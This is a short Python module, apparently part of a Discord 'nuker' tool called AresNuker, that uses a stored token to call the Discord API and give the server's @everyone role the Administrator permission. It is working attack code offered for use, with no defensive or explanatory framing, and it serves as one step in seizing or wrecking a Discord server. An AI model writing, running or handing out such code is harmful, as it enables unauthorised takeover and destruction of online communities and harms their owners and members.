__import__('sys').path.append('../')
import global_vars, requests, json
from AresNuker import Console

console = Console()
headers = global_vars.headers

def GetAdmin() -> None:
	payload = {
		'permissions': 8
	}
	r = requests.patch(f"https://discord.com/api/v8//guilds/{global_vars.guild_id}/roles/{global_vars.guild_id}", headers = headers, json = payload)
	if r.status_code == 200:
		console.log('Got Admin')
	else:
		console.error('Cant get Admin')